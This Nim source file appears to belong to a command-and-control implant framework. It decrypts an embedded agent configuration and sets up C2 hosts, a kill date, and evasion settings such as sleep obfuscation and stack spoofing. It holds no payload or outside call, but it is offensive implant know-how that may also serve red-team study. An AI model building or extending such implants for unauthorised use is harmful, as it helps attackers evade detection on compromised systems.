import parsetoml, system
import ../utils/io
import ../../common/[types, utils, crypto, serialize]

const CONFIGURATION {.strdefine.}: string = ""

proc deserializeConfiguration(config: string): AgentCtx = 
    
    var unpacker = Unpacker.init(config) 
        
    var aesKey = unpacker.getByteArray(Key)
    let 
        iv = unpacker.getByteArray(Iv)
        authTag = unpacker.getByteArray(AuthenticationTag)
        length = int(unpacker.getUint32())  

    # Decrypt profile configuration
    let (decData, gmac) = decrypt(aesKey, iv, unpacker.getBytes(length))
    wipeKey(aesKey)

    if gmac != authTag: 
        raise newException(CatchableError, protect("Invalid authentication tag."))

    # Parse decrypted profile configuration 
    unpacker = Unpacker.init(Bytes.toString(decData))

    var agentKeyPair = generateKeyPair() 
    var ctx = AgentCtx(
        agentId: generateUUID(),
        listenerId: Uuid.toString(unpacker.getUint32()),
        hosts: unpacker.getDataWithLengthPrefix(),
        sleepSettings: SleepSettings(
            sleepDelay: unpacker.getUint32(),
            jitter: unpacker.getUint32(),
            sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
            spoofStack: cast[bool](unpacker.getUint8()),
            workingHours: WorkingHours(
                enabled: cast[bool](unpacker.getUint8()),
                startHour: cast[int32](unpacker.getUint32()),
                startMinute: cast[int32](unpacker.getUint32()),
                endHour: cast[int32](unpacker.getUint32()),
                endMinute: cast[int32](unpacker.getUint32())
            )
        ),
        killDate: cast[int64](unpacker.getUint64()),
        sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
        agentPublicKey: agentKeyPair.publicKey,
        profile: parseString(unpacker.getDataWithLengthPrefix()),
        registered: false
    ) 

    wipeKey(agentKeyPair.privateKey)
    
    print "[+] Profile configuration deserialized."
    return ctx

proc init*(T: type AgentCtx): AgentCtx = 

    try: 
        when not defined(CONFIGURATION):
            raise newException(CatchableError, protect("Missing agent configuration."))

        return deserializeConfiguration(CONFIGURATION)

    except CatchableError as err:
        print "[-] " & err.msg
        return nil



